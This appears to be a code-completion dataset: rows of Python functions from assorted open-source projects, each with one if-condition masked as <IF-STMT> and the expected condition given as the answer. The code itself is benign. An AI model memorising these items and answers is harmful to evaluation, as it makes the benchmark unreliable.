2928,"def stop(self):<tab>""""""Stop the HTTP server.""""""<tab>if self.running:<tab><tab># stop() MUST block until the server is *truly* stopped.<tab><tab>self.httpserver.stop()<tab><tab># Wait for the socket to be truly freed.<tab><tab><IF-STMT><tab><tab><tab>portend.free(*self.bound_addr, timeout=Timeouts.free)<tab><tab>self.running = False<tab><tab>self.bus.log(""HTTP Server %s shut down"" % self.httpserver)<tab>else:<tab><tab>self.bus.log(""HTTP Server %s already shut down"" % self.httpserver)","if isinstance ( self . bind_addr , tuple ) :",156
2929,"def dump_json(testcase, json_file):<tab>""""""dump HAR entries to json testcase""""""<tab>logger.info(""dump testcase to JSON format."")<tab>with open(json_file, ""w"", encoding=""utf-8"") as outfile:<tab><tab>my_json_str = json.dumps(testcase, ensure_ascii=False, indent=4)<tab><tab><IF-STMT><tab><tab><tab>my_json_str = my_json_str.decode(""utf-8"")<tab><tab>outfile.write(my_json_str)<tab>logger.info(""Generate JSON testcase successfully: {}"".format(json_file))","if isinstance ( my_json_str , bytes ) :",148
2930,"def find_comment(line):<tab>""""""Finds the index of a comment # and returns None if not found""""""<tab>instring, instring_char = False, """"<tab>for i, char in enumerate(line):<tab><tab>if char in ('""', ""'""):<tab><tab><tab>if instring:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>instring = False<tab><tab><tab><tab><tab>instring_char = """"<tab><tab><tab>else:<tab><tab><tab><tab>instring = True<tab><tab><tab><tab>instring_char = char<tab><tab>elif char == ""#"":<tab><tab><tab>if not instring:<tab><tab><tab><tab>return i<tab>return None",if char == instring_char :,155
2931,"def _requests_to_follow(self, response):<tab>if not isinstance(response, HtmlResponse):<tab><tab>return<tab>seen = set()<tab>for n, rule in enumerate(self._rules):<tab><tab>links = [<tab><tab><tab>lnk<tab><tab><tab>for lnk in rule.link_extractor.extract_links(response)<tab><tab><tab>if lnk not in seen<tab><tab>]<tab><tab><IF-STMT><tab><tab><tab>links = rule.process_links(links)<tab><tab>for link in links:<tab><tab><tab>seen.add(link)<tab><tab><tab>request = self._build_request(n, link)<tab><tab><tab>yield rule._process_request(request, response)",if links and rule . process_links :,168
2932,"def _process_iter(self, line_iter):<tab>samples = []<tab>buf = []<tab>for line in line_iter:<tab><tab>if not buf and line.startswith(""#"") and self._has_comment:<tab><tab><tab>continue<tab><tab>line = line.split()<tab><tab><IF-STMT><tab><tab><tab>buf.append(line)<tab><tab>elif buf:<tab><tab><tab>samples.append(tuple(map(list, zip(*buf))))<tab><tab><tab>buf = []<tab>if buf:<tab><tab>samples.append(tuple(map(list, zip(*buf))))<tab>return samples",if line :,137
2933,"def _set_input_expanded(self, inp, expand, scroll=True):<tab>getobj = self._builder.get_object<tab>arrow = getobj(""by%s_expander_arrow"" % (inp.name,))<tab>grid = getobj(""by%s_curve_grid"" % (inp.name,))<tab>if expand:<tab><tab>arrow.set_property(""arrow-type"", Gtk.ArrowType.DOWN)<tab><tab>grid.show_all()<tab><tab><IF-STMT><tab><tab><tab>GLib.idle_add(self._scroll_setting_editor, grid)<tab>else:<tab><tab>arrow.set_property(""arrow-type"", Gtk.ArrowType.RIGHT)<tab><tab>grid.hide()",if scroll :,164
2934,"def extract_groups(self, text: str, language_code: str):<tab>previous = None<tab>group = 1<tab>groups = []<tab>words = []<tab>ignored = IGNORES.get(language_code, {})<tab>for word in NON_WORD.split(text):<tab><tab>if not word:<tab><tab><tab>continue<tab><tab>if word not in ignored and len(word) >= 2:<tab><tab><tab>if previous == word:<tab><tab><tab><tab>group += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>groups.append(group)<tab><tab><tab><tab>words.append(previous)<tab><tab><tab><tab>group = 1<tab><tab>previous = word<tab>if group > 1:<tab><tab>groups.append(group)<tab><tab>words.append(previous)<tab>return groups, words",elif group > 1 :,187
2935,"def add_field_to_csv_file(fieldName, fieldNameMap, fieldsList, fieldsTitles, titles):<tab>for ftList in fieldNameMap[fieldName]:<tab><tab><IF-STMT><tab><tab><tab>fieldsList.append(ftList)<tab><tab><tab>fieldsTitles[ftList] = ftList<tab><tab><tab>add_titles_to_csv_file([ftList], titles)",if ftList not in fieldsTitles :,96
2936,"def get_transform(self, img):<tab>check_dtype(img)<tab>assert img.ndim in [2, 3], img.ndim<tab>from .transform import LazyTransform, TransformList<tab># The next augmentor requires the previous one to finish.<tab># So we have to use LazyTransform<tab>tfms = []<tab>for idx, a in enumerate(self.augmentors):<tab><tab>if idx == 0:<tab><tab><tab>t = a.get_transform(img)<tab><tab>else:<tab><tab><tab>t = LazyTransform(a.get_transform)<tab><tab><IF-STMT><tab><tab><tab>tfms.extend(t.tfms)<tab><tab>else:<tab><tab><tab>tfms.append(t)<tab>return TransformList(tfms)","if isinstance ( t , TransformList ) :",180
2937,"def __init__(self, template, context, body_stream=None):<tab>if body_stream is None:<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""Async mode requires a body stream ""<tab><tab><tab><tab>""to be passed to a template module.  Use ""<tab><tab><tab><tab>""the async methods of the API you are ""<tab><tab><tab><tab>""using.""<tab><tab><tab>)<tab><tab>body_stream = list(template.root_render_func(context))<tab>self._body_stream = body_stream<tab>self.__dict__.update(context.get_exported())<tab>self.__name__ = template.name",if context . environment . is_async :,157
2938,"def url_locations(urls, faker=False):<tab>locations = []<tab>for url in urls:<tab><tab><IF-STMT><tab><tab><tab>response = request.urlopen(request.Request(url, headers=fake_headers), None)<tab><tab>else:<tab><tab><tab>response = request.urlopen(request.Request(url))<tab><tab>locations.append(response.url)<tab>return locations",if faker :,90
2939,"def wait_services_ready(selectors, min_counts, count_fun, timeout=None):<tab>readies = [0] * len(selectors)<tab>start_time = time.time()<tab>while True:<tab><tab>all_satisfy = True<tab><tab>for idx, selector in enumerate(selectors):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>all_satisfy = False<tab><tab><tab><tab>readies[idx] = count_fun(selector)<tab><tab><tab><tab>break<tab><tab>if all_satisfy:<tab><tab><tab>break<tab><tab>if timeout and timeout + start_time < time.time():<tab><tab><tab>raise TimeoutError(""Wait cluster start timeout"")<tab><tab>time.sleep(1)",if readies [ idx ] < min_counts [ idx ] :,167
2940,"def sanitize_args(a):<tab>try:<tab><tab>args, kwargs = a<tab><tab>if isinstance(args, tuple) and isinstance(kwargs, dict):<tab><tab><tab>return args, dict(kwargs)<tab>except (TypeError, ValueError):<tab><tab>args, kwargs = (), {}<tab>if a is not None:<tab><tab>if isinstance(a, dict):<tab><tab><tab>args = tuple()<tab><tab><tab>kwargs = a<tab><tab>elif isinstance(a, tuple):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>args, kwargs = a[0:-1], a[-1]<tab><tab><tab>else:<tab><tab><tab><tab>args = a<tab><tab><tab><tab>kwargs = {}<tab>return args, kwargs","if isinstance ( a [ - 1 ] , dict ) :",168
2941,"def _override_options(options, **overrides):<tab>""""""Override options.""""""<tab>for opt, val in overrides.items():<tab><tab>passed_value = getattr(options, opt, _Default())<tab><tab>if opt in (""ignore"", ""select"") and passed_value:<tab><tab><tab>value = process_value(opt, passed_value.value)<tab><tab><tab>value += process_value(opt, val)<tab><tab><tab>setattr(options, opt, value)<tab><tab><IF-STMT><tab><tab><tab>setattr(options, opt, process_value(opt, val))","elif isinstance ( passed_value , _Default ) :",137
2942,"def get_first_file_by_stem(dir_path, stem, exts=None):<tab>dir_path = Path(dir_path)<tab>stem = stem.lower()<tab>if dir_path.exists():<tab><tab>for x in sorted(list(scandir(str(dir_path))), key=lambda x: x.name):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>xp = Path(x.path)<tab><tab><tab>if xp.stem.lower() == stem and (exts is None or xp.suffix.lower() in exts):<tab><tab><tab><tab>return xp<tab>return None",if not x . is_file ( ) :,148
2943,"def testShortCircuit(self):<tab>""""""Test that creation short-circuits to reuse existing references""""""<tab>sd = {}<tab>for s in self.ss:<tab><tab>sd[s] = 1<tab>for t in self.ts:<tab><tab><IF-STMT><tab><tab><tab>self.assert_(sd.has_key(safeRef(t.x)))<tab><tab><tab>self.assert_(safeRef(t.x) in sd)<tab><tab>else:<tab><tab><tab>self.assert_(sd.has_key(safeRef(t)))<tab><tab><tab>self.assert_(safeRef(t) in sd)","if hasattr ( t , ""x"" ) :",146
2944,"def _gen_Less(self, args, ret_type):<tab>result = []<tab>for lhs, rhs in pairwise(args):<tab><tab>if ret_type == real_type:<tab><tab><tab>result.append(self.builder.fcmp_ordered(""<"", lhs, rhs))<tab><tab><IF-STMT><tab><tab><tab>result.append(self.builder.icmp_signed(""<"", lhs, rhs))<tab><tab>else:<tab><tab><tab>raise CompileError()<tab>return reduce(self.builder.and_, result)",elif ret_type == int_type :,120
2945,def _resolve_aliases(tasks_or_files):<tab>for task_or_file in tasks_or_files:<tab><tab><IF-STMT><tab><tab><tab>for t_or_f in _resolve_aliases(task_or_file.deps):<tab><tab><tab><tab>yield t_or_f<tab><tab>else:<tab><tab><tab>yield task_or_file,"if isinstance ( task_or_file , Alias ) :",92
2946,"def report(properties):<tab>for name, value in properties:<tab><tab><IF-STMT><tab><tab><tab>if hasattr(value, ""uniobj""):<tab><tab><tab><tab># Under old versions of pytest, `value` was a `py.xml.raw`<tab><tab><tab><tab># rather than a string, so we get the (unicode) string off it.<tab><tab><tab><tab>value = value.uniobj<tab><tab><tab>line = base64.b64decode(value.encode()).decode() + ""\n\n""<tab><tab><tab>terminalreporter.write_line(line)","if name . startswith ( ""hypothesis-statistics-"" ) :",135
2947,"def throw_404(self, n):<tab># bl_label of some nodes is edited by us, but those nodes do have docs ..<tab>_dirname = os.path.dirname(sverchok.__file__)<tab>path1 = os.path.join(_dirname, ""docs"", ""404.html"")<tab>path2 = os.path.join(_dirname, ""docs"", ""404_custom.html"")<tab>with open(path1) as origin:<tab><tab>with open(path2, ""w"") as destination:<tab><tab><tab>for line in origin:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>destination.write(line.replace(""{{variable}}"", n.bl_label))<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>destination.write(line)<tab>webbrowser.open(path2)","if ""{{variable}}"" in line :",193
2948,"def rm_empty_dirs(dirpath, interactive=False, dry_run=False):<tab>for name in os.listdir(dirpath):<tab><tab>path = join(dirpath, name)<tab><tab><IF-STMT><tab><tab><tab>rm_empty_dirs(path, interactive, dry_run)<tab>if not os.listdir(dirpath):<tab><tab>if interactive:<tab><tab><tab>raise NotImplementedError(""'-i' not implemented"")<tab><tab>if dry_run:<tab><tab><tab>log.info(""rmdir `%s' (dry-run)"", dirpath)<tab><tab>else:<tab><tab><tab>log.info(""rmdir `%s'"", dirpath)<tab><tab><tab>os.rmdir(dirpath)",if isdir ( path ) :,153
2949,"def get_run_cmd(submission_dir):<tab>""""""Get the language of a submission""""""<tab>with CD(submission_dir):<tab><tab><IF-STMT><tab><tab><tab>with open(""run.sh"") as f:<tab><tab><tab><tab>for line in f:<tab><tab><tab><tab><tab>if line[0] != ""#"":<tab><tab><tab><tab><tab><tab>return line.rstrip(""\r\n"")","if os . path . exists ( ""run.sh"" ) :",98
2950,"def _do_test_fetch_result(self, results, remote):<tab># self._print_fetchhead(remote.repo)<tab>self.assertGreater(len(results), 0)<tab>self.assertIsInstance(results[0], FetchInfo)<tab>for info in results:<tab><tab>self.assertIsInstance(info.note, string_types)<tab><tab>if isinstance(info.ref, Reference):<tab><tab><tab>self.assertTrue(info.flags)<tab><tab># END reference type flags handling<tab><tab>self.assertIsInstance(info.ref, (SymbolicReference, Reference))<tab><tab><IF-STMT><tab><tab><tab>self.assertIsInstance(info.old_commit, Commit)<tab><tab>else:<tab><tab><tab>self.assertIsNone(info.old_commit)",if info . flags & ( info . FORCED_UPDATE | info . FAST_FORWARD ) :,186
2951,"def __set__(self, instance, value):<tab>super().__set__(instance, value)<tab>value = instance._data[self.name]<tab>if value is not None:<tab><tab><IF-STMT><tab><tab><tab>instance._data[self.name] = self._convert_from_datetime(value)<tab><tab>else:<tab><tab><tab>instance._data[self.name] = value","if isinstance ( value , datetime . datetime ) :",95
2952,"def put(self, can_split=False):<tab>if isinstance(self.expr, NodeConst):<tab><tab><IF-STMT>  # 2007 May 01<tab><tab><tab>self.expr.put()<tab><tab>else:<tab><tab><tab>self.line_more(""("")<tab><tab><tab>self.expr.put(can_split=True)<tab><tab><tab>self.line_more("")"")<tab>else:<tab><tab>self.put_expr(self.expr, can_split=can_split)<tab>self.line_more(""."")<tab>self.line_more(NAME_SPACE.make_attr_name(self.expr, self.attrname))<tab>return self",if self . expr . is_str ( ) :,157
2953,"def get_location(self, dist, dependency_links):<tab>for url in dependency_links:<tab><tab>egg_fragment = Link(url).egg_fragment<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""-"" in egg_fragment:<tab><tab><tab>## FIXME: will this work when a package has - in the name?<tab><tab><tab>key = ""-"".join(egg_fragment.split(""-"")[:-1]).lower()<tab><tab>else:<tab><tab><tab>key = egg_fragment<tab><tab>if key == dist.key:<tab><tab><tab>return url.split(""#"", 1)[0]<tab>return None",if not egg_fragment :,141
2954,"def _parse_lines(self, lines):<tab>for line in lines:<tab><tab>self.size += len(line)<tab><tab>words = line.strip().split(""\t"")<tab><tab>if len(words) > 1:<tab><tab><tab>wset = set(words[1:])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.WORDS[words[0]] |= wset<tab><tab><tab>else:<tab><tab><tab><tab>self.WORDS[words[0]] = wset",if words [ 0 ] in self . WORDS :,118
2955,"def __call__(self, target):<tab># normal running mode<tab>if not self.check_run_always:<tab><tab>for algo in self.algos:<tab><tab><tab>if not algo(target):<tab><tab><tab><tab>return False<tab><tab>return True<tab># run mode when at least one algo has a run_always attribute<tab>else:<tab><tab># store result in res<tab><tab># allows continuation to check for and run<tab><tab># algos that have run_always set to True<tab><tab>res = True<tab><tab>for algo in self.algos:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>res = algo(target)<tab><tab><tab>elif hasattr(algo, ""run_always""):<tab><tab><tab><tab>if algo.run_always:<tab><tab><tab><tab><tab>algo(target)<tab><tab>return res",if res :,188
2956,"def _cmd_flags_as_data(cmd_flags):<tab>data = {}<tab>for flag_name, cmd_flag in cmd_flags.items():<tab><tab>cmd_flag_data = _cmd_flag_as_data(cmd_flag)<tab><tab><IF-STMT><tab><tab><tab>data[flag_name] = cmd_flag_data<tab>return data",if cmd_flag_data :,89
2957,"def _csv_iterator(data_path, ngrams, yield_cls=False):<tab>tokenizer = get_tokenizer(""basic_english"")<tab>with io.open(data_path, encoding=""utf8"") as f:<tab><tab>reader = unicode_csv_reader(f)<tab><tab>for row in reader:<tab><tab><tab>tokens = "" "".join(row[1:])<tab><tab><tab>tokens = tokenizer(tokens)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield int(row[0]) - 1, ngrams_iterator(tokens, ngrams)<tab><tab><tab>else:<tab><tab><tab><tab>yield ngrams_iterator(tokens, ngrams)",if yield_cls :,147
2958,"def FindEnclosingBracketGroup(input_str):<tab>stack = []<tab>start = -1<tab>for index, char in enumerate(input_str):<tab><tab>if char in LBRACKETS:<tab><tab><tab>stack.append(char)<tab><tab><tab>if start == -1:<tab><tab><tab><tab>start = index<tab><tab>elif char in BRACKETS:<tab><tab><tab>if not stack:<tab><tab><tab><tab>return (-1, -1)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return (-1, -1)<tab><tab><tab>if not stack:<tab><tab><tab><tab>return (start, index + 1)<tab>return (-1, -1)",if stack . pop ( ) != BRACKETS [ char ] :,163
2959,def get_and_set_be_comp(self):<tab>all_be_comp = []<tab>for page in self.pages:<tab><tab>if page.relations.be_comp_norm is not None:<tab><tab><tab>all_be_comp.extend(page.relations.be_comp_norm)<tab><tab><IF-STMT><tab><tab><tab>all_be_comp.extend(page.relations.be_comp)<tab>return set(all_be_comp),if page . relations . be_comp is not None :,117
2960,"def iterload(self):<tab>delim = self.options.delimiter<tab>rowdelim = self.options.row_delimiter<tab>with self.source.open_text() as fp:<tab><tab>with Progress(total=filesize(self.source)) as prog:<tab><tab><tab>for line in splitter(fp, rowdelim):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>prog.addProgress(len(line))<tab><tab><tab><tab>row = list(line.split(delim))<tab><tab><tab><tab>if len(row) < self.nVisibleCols:<tab><tab><tab><tab><tab># extend rows that are missing entries<tab><tab><tab><tab><tab>row.extend([None] * (self.nVisibleCols - len(row)))<tab><tab><tab><tab>yield row",if not line :,182
2961,"def process_module(name, module, parent):<tab>if parent:<tab><tab>modules[parent][""items""].append(name)<tab><tab>mg = module_groups.setdefault(name, [])<tab><tab>mg.append(parent)<tab><tab>if get_module_type(name) == ""py3status"":<tab><tab><tab>module["".group""] = parent<tab># check module content<tab>for k, v in list(module.items()):<tab><tab>if k.startswith(""on_click""):<tab><tab><tab># on_click event<tab><tab><tab>process_onclick(k, v, name)<tab><tab><tab># on_click should not be passed to the module via the config.<tab><tab><tab>del module[k]<tab><tab><IF-STMT><tab><tab><tab># we are a container<tab><tab><tab>module[""items""] = []<tab>return module","if isinstance ( v , ModuleDefinition ) :",198
2962,"def test_identify_accepts_space_separated_hosts(self):<tab>ru, iu = self.mock_all_identify()<tab>file_ip = open(tests.VALID_FILE_IP)<tab>for i, line in enumerate(file_ip):<tab><tab><IF-STMT><tab><tab><tab>expected_url, expected_host = (""http://192.168.1.1/"", ""example.com"")<tab><tab>elif i == 2:<tab><tab><tab>expected_url, expected_host = (""http://192.168.1.2/drupal/"", ""example.com"")<tab><tab>identify_line(line)<tab><tab>args, kwargs = ru.call_args_list[-1]<tab><tab>self.assertEquals(args[0], expected_url)<tab><tab>self.assertEquals(args[1], expected_host)",if i < 2 :,195
2963,"def get_version(module):<tab>for key in version_keys:<tab><tab><IF-STMT><tab><tab><tab>version = getattr(module, key)<tab><tab><tab>if isinstance(version, types.ModuleType):<tab><tab><tab><tab>version = get_version(version)<tab><tab><tab>return version<tab>return ""Unknown""","if hasattr ( module , key ) :",77
2964,"def whoami(self):<tab>""""""Return user relevant login information.""""""<tab>account_data = {}<tab>for k in (""email"", ""account_id""):<tab><tab>value = self.conf.get(k)<tab><tab><IF-STMT><tab><tab><tab>account_info = self.get_account_information()<tab><tab><tab>value = account_info.get(k, ""unknown"")<tab><tab><tab>self.conf.set(k, value)<tab><tab><tab>self.conf.save()<tab><tab>account_data[k] = value<tab>return account_data",if not value :,130
2965,"def do(self):<tab>if self.in_class_scope():<tab><tab>selected_str = self.view.substr(self.selected_region)<tab><tab>for symbol in self.view.symbols():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.view.sel().clear()<tab><tab><tab><tab>self.view.sel().add(symbol[0])<tab><tab><tab><tab>self.view.show(symbol[0])<tab><tab><tab><tab>return<tab># falls back to the original functionality<tab>self.window.run_command(""goto_definition"")",if symbol [ 1 ] == selected_str :,136
2966,"def __iter__(self):<tab>i = 0<tab>for category, filename in list(self.input_files.items()):<tab><tab>for line in open(filename):<tab><tab><tab>line = self._clean_line(line)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield Opinion(line, category)<tab><tab><tab>i += 1<tab><tab><tab>if i % 1000 == 0:<tab><tab><tab><tab>print(""\tReaded {} examples"".format(i))",if self . accept_criteria ( i ) :,115
2967,"def recvmsg(self, *args):<tab>while True:<tab><tab>try:<tab><tab><tab>return self._sock.recvmsg(*args)<tab><tab>except error as ex:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab>self._wait(self._read_event)",if ex . args [ 0 ] != EWOULDBLOCK or self . timeout == 0.0 :,87
2968,"def _get_editable_fields(cls):<tab>fds = set([])<tab>for field in cls._meta.concrete_fields:<tab><tab><IF-STMT><tab><tab><tab>if field.attname == ""id"":<tab><tab><tab><tab>continue<tab><tab><tab>elif field.attname.endswith(""ptr_id""):<tab><tab><tab><tab># polymorphic fields should always be non-editable, see:<tab><tab><tab><tab># https://github.com/django-polymorphic/django-polymorphic/issues/349<tab><tab><tab><tab>continue<tab><tab><tab>if getattr(field, ""editable"", True):<tab><tab><tab><tab>fds.add(field.attname)<tab>return fds","if hasattr ( field , ""attname"" ) :",159
2969,"def prepare_fields(all_fields, submit_fields, submit):<tab>if len(list(submit_fields.items(multi=True))) > 1:<tab><tab>if not submit:<tab><tab><tab>raise exceptions.InvalidSubmitError()<tab><tab><IF-STMT><tab><tab><tab>raise exceptions.InvalidSubmitError()<tab><tab>return _filter_fields(<tab><tab><tab>all_fields, lambda f: not isinstance(f, fields.Submit) or f == submit<tab><tab>)<tab>return all_fields",if submit not in submit_fields . getlist ( submit . name ) :,123
2970,"def tag_configure(self, *args, **keys):<tab>if len(args) == 1:<tab><tab>key = args[0]<tab><tab>self.tags[key] = keys<tab><tab>val = keys.get(""foreground"")<tab><tab>underline = keys.get(""underline"")<tab><tab><IF-STMT><tab><tab><tab>self.configDict[key] = val<tab><tab>if underline:<tab><tab><tab>self.configUnderlineDict[key] = True<tab>else:<tab><tab>g.trace(""oops"", args, keys)",if val :,123
2971,"def detect(get_page):<tab>retval = False<tab>for vector in WAF_ATTACK_VECTORS:<tab><tab>page, headers, code = get_page(get=vector)<tab><tab>retval = (<tab><tab><tab>code == 501<tab><tab><tab>and re.search(r""Reference #[0-9A-Fa-f.]+"", page, re.I) is not None<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>break<tab>return retval",if retval :,112
2972,"def refine_pointer_names_input(lines):<tab>""""""Return  a list of width_info_t. Skip comments and blank lines""""""<tab>global comment_pattern<tab>widths_list = []<tab>for line in lines:<tab><tab>pline = comment_pattern.sub("""", line).strip()<tab><tab>if pline == """":<tab><tab><tab>continue<tab><tab>wrds = pline.split()<tab><tab>ntokens = len(wrds)<tab><tab><IF-STMT><tab><tab><tab>(bbytes, name, suffix) = wrds<tab><tab>else:<tab><tab><tab>die(""Bad number of tokens on line: "" + line)<tab><tab>widths_list.append((bbytes, name, suffix))<tab>return widths_list",if ntokens == 3 :,169
2973,"def notify(title, message, retcode=None):<tab>""""""Sends message over Telegram using telegram-send, title is ignored.""""""<tab>if not path.exists(config_file):<tab><tab><IF-STMT><tab><tab><tab>makedirs(config_dir)<tab><tab>print(""Follow the instructions to configure the Telegram backend.\n"")<tab><tab>configure(config_file)<tab>send(messages=[message], conf=config_file)",if not path . exists ( config_dir ) :,104
2974,"def find_on_path(targets):<tab>""""""Search the PATH for a program and return full path""""""<tab>if sabnzbd.WIN32:<tab><tab>paths = os.getenv(""PATH"").split("";"")<tab>else:<tab><tab>paths = os.getenv(""PATH"").split("":"")<tab>if isinstance(targets, str):<tab><tab>targets = (targets,)<tab>for path in paths:<tab><tab>for target in targets:<tab><tab><tab>target_path = os.path.abspath(os.path.join(path, target))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return target_path<tab>return None","if os . path . isfile ( target_path ) and os . access ( target_path , os . X_OK ) :",164
2975,"def test_name_attribute(self):<tab>for cons in self.hash_constructors:<tab><tab>h = cons()<tab><tab>self.assertIsInstance(h.name, str)<tab><tab><IF-STMT><tab><tab><tab>self.assertIn(h.name, self.supported_hash_names)<tab><tab>else:<tab><tab><tab>self.assertNotIn(h.name, self.supported_hash_names)<tab><tab>self.assertEqual(h.name, hashlib.new(h.name).name)",if h . name in self . supported_hash_names :,124
2976,"def find_marriage(database, family):<tab>""""""find the marriage of a family""""""<tab>for event_ref in family.get_event_ref_list():<tab><tab>event = database.get_event_from_handle(event_ref.ref)<tab><tab><IF-STMT><tab><tab><tab>return event<tab>return None",if event and event . type . is_marriage ( ) and event_ref . role . is_family ( ) :,96
2977,"def test_find_ancestors(self):<tab>vhsblocks = self.config.parser_root.find_blocks(""VirtualHost"")<tab>macro_test = False<tab>nonmacro_test = False<tab>for vh in vhsblocks:<tab><tab><IF-STMT><tab><tab><tab>ancs = vh.find_ancestors(""Macro"")<tab><tab><tab>self.assertEqual(len(ancs), 1)<tab><tab><tab>macro_test = True<tab><tab>else:<tab><tab><tab>ancs = vh.find_ancestors(""Macro"")<tab><tab><tab>self.assertEqual(len(ancs), 0)<tab><tab><tab>nonmacro_test = True<tab>self.assertTrue(macro_test)<tab>self.assertTrue(nonmacro_test)","if ""/macro/"" in vh . metadata [ ""augeaspath"" ] . lower ( ) :",183
2978,def readline(self):<tab>while 1:<tab><tab>line = self._readline()<tab><tab><IF-STMT><tab><tab><tab>self._filelineno += 1<tab><tab><tab>return line<tab><tab>if not self._file:<tab><tab><tab>return line<tab><tab>self.nextfile(),if line :,65
2979,"def read_oclc(fields):<tab>if ""035"" not in fields:<tab><tab>return {}<tab>found = []<tab>for line in fields[""035""]:<tab><tab>for v in get_subfield_values(line, [""a""]):<tab><tab><tab>m = re_oclc.match(v)<tab><tab><tab>if not m:<tab><tab><tab><tab>continue<tab><tab><tab>oclc = m.group(1)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>found.append(oclc)<tab>return {""oclc_number"": found} if found else {}",if oclc not in found :,143
2980,"def get_new_unlinked_nodes(<tab>before_inputted_nodes, before_input_sockets, input_sockets, nodes_dict):<tab>affected_nodes = []<tab>for node_id, socket in zip(before_inputted_nodes, before_input_sockets):<tab><tab>if not socket in input_sockets:<tab><tab><tab># if the node has been deleted it is not affected<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if not node_id in affected_nodes:<tab><tab><tab><tab><tab>affected_nodes.append(node_id)<tab>return affected_nodes",if node_id in nodes_dict :,141
2981,"def set_available_qty(self):<tab>for d in self.get(""required_items""):<tab><tab><IF-STMT><tab><tab><tab>d.available_qty_at_source_warehouse = get_latest_stock_qty(<tab><tab><tab><tab>d.item_code, d.source_warehouse<tab><tab><tab>)<tab><tab>if self.wip_warehouse:<tab><tab><tab>d.available_qty_at_wip_warehouse = get_latest_stock_qty(<tab><tab><tab><tab>d.item_code, self.wip_warehouse<tab><tab><tab>)",if d . source_warehouse :,136
2982,"def _unique_product_recursive(pools, result, i):<tab>if i >= len(pools):<tab><tab>yield tuple(result)<tab><tab>return<tab>for e in pools[i]:<tab><tab><IF-STMT><tab><tab><tab>result[i] = e<tab><tab><tab>yield from _unique_product_recursive(pools, result, i + 1)<tab><tab><tab>result[i] = _SENTINEL",if e not in result :,98
2983,def fileno(self):<tab>try:<tab><tab>return self.sock.fileno()<tab>except socket.error:<tab><tab>self.close()<tab><tab>ex = sys.exc_info()[1]<tab><tab><IF-STMT><tab><tab><tab>raise EOFError()<tab><tab>else:<tab><tab><tab>raise,if get_exc_errno ( ex ) == errno . EBADF :,84
2984,"def expand_block(self, feat):<tab>""""""Expand any blocks which are near the start or end of a contig.""""""<tab>chrom_end = self._ref_sizes.get(feat.chrom)<tab>if chrom_end:<tab><tab>if feat.start < self._end_buffer:<tab><tab><tab>feat.start = 0<tab><tab><IF-STMT><tab><tab><tab>feat.stop = chrom_end<tab>return feat",if feat . stop >= chrom_end - self . _end_buffer :,114
2985,"def prepare_parser(self, parser):<tab>docs = [self.parse_doc(doc) for doc in (self.doc, __doc__) if doc]<tab>for doc in docs:<tab><tab>for long_opt, help in items(doc):<tab><tab><tab>option = parser._option_string_actions[long_opt]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>option.help = "" "".join(help).format(default=option.default)<tab>return parser",if option is not None :,113
2986,"def negate(monad):<tab>sql = monad.getsql()[0]<tab>translator = monad.translator<tab>if translator.dialect == ""Oracle"":<tab><tab>result_sql = [""IS_NULL"", sql]<tab>else:<tab><tab>result_sql = [""EQ"", sql, [""VALUE"", """"]]<tab><tab>if monad.nullable:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result_sql = [""OR"", result_sql, [""IS_NULL"", sql]]<tab><tab><tab>else:<tab><tab><tab><tab>result_sql = [""EQ"", [""COALESCE"", sql, [""VALUE"", """"]], [""VALUE"", """"]]<tab>result = BoolExprMonad(result_sql, nullable=False)<tab>result.aggregated = monad.aggregated<tab>return result","if isinstance ( monad , AttrMonad ) :",188
2987,"def _ReadN(self, stdin_fd, n):<tab># type: (int, int) -> str<tab>chunks = []  # type: List[str]<tab>bytes_left = n<tab>while bytes_left > 0:<tab><tab>chunk = posix.read(stdin_fd, n)  # read at up to N chars<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>chunks.append(chunk)<tab><tab>bytes_left -= len(chunk)<tab>s = """".join(chunks)<tab>return s",if len ( chunk ) == 0 :,127
2988,"def instance_reader():<tab>for epoch_index in range(epoch):<tab><tab>if shuffle:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>np.random.seed(shuffle_seed)<tab><tab><tab>np.random.shuffle(examples)<tab><tab>if phase == ""train"":<tab><tab><tab>self.current_train_epoch = epoch_index<tab><tab>for (index, example) in enumerate(examples):<tab><tab><tab>if phase == ""train"":<tab><tab><tab><tab>self.current_train_example = index + 1<tab><tab><tab>feature = self.convert_example(<tab><tab><tab><tab>index, example, self.get_labels(), self.max_seq_len, self.tokenizer<tab><tab><tab>)<tab><tab><tab>instance = self.generate_instance(feature)<tab><tab><tab>yield instance",if shuffle_seed is not None :,189
2989,"def close(self):<tab>fileobj = self.fileobj<tab>if fileobj is None:<tab><tab>return<tab>self.fileobj = None<tab>try:<tab><tab>if self.mode == WRITE:<tab><tab><tab>fileobj.write(self.compress.flush())<tab><tab><tab>write32u(fileobj, self.crc)<tab><tab><tab># self.size may exceed 2GB, or even 4GB<tab><tab><tab>write32u(fileobj, self.size & 0xFFFFFFFF)<tab>finally:<tab><tab>myfileobj = self.myfileobj<tab><tab><IF-STMT><tab><tab><tab>self.myfileobj = None<tab><tab><tab>myfileobj.close()",if myfileobj :,147
